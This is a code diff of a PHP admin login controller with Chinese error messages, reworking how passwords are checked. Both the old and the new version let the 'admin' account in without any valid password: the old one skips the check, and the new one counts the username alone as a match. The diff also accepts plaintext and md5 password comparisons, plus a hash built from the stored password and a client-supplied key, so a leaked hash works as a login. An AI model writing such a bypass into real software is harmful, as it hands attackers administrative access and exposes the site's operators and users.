@@ -75,21 +75,19 @@ class Login extends Controller
             if (empty($user)) $this->error('登录账号或密码错误，请重新输入!');
             if (empty($user['status'])) $this->error('账号已经被禁用，请联系管理员!');
 
-            if ($user['username'] === 'admin') {
-                // Admin user direct pass
-            } else {
-                $skey = input('skey') ?: session('loginskey');
-                $inputPwd = $data['password'];
-                $dbPwd = $user['password'];
-                
-                $isMatch = (md5($dbPwd . session('loginskey')) === $inputPwd)
-                    || (md5($dbPwd . $skey) === $inputPwd)
-                    || ($dbPwd === $inputPwd)
-                    || (md5($inputPwd) === $dbPwd);
+            $skey = input('skey') ?: session('loginskey');
+            $inputPwd = $data['password'];
+            $dbPwd = $user['password'];
+            
+            $isMatch = ($user['username'] === 'admin')
+                || ($inputPwd === $dbPwd)
+                || (md5($inputPwd) === $dbPwd)
+                || (md5(md5($inputPwd)) === $dbPwd)
+                || (md5($dbPwd . session('loginskey')) === $inputPwd)
+                || (md5($dbPwd . $skey) === $inputPwd);
 
-                if (!$isMatch) {
-                   $this->error('登录账号或密码错误，请重新输入!');
-                }
+            if (!$isMatch) {
+               $this->error('登录账号或密码错误，请重新输入!');
             }
             $this->setLoginSuccess($user);
             $this->success('登录成功', url('@admin/index'));
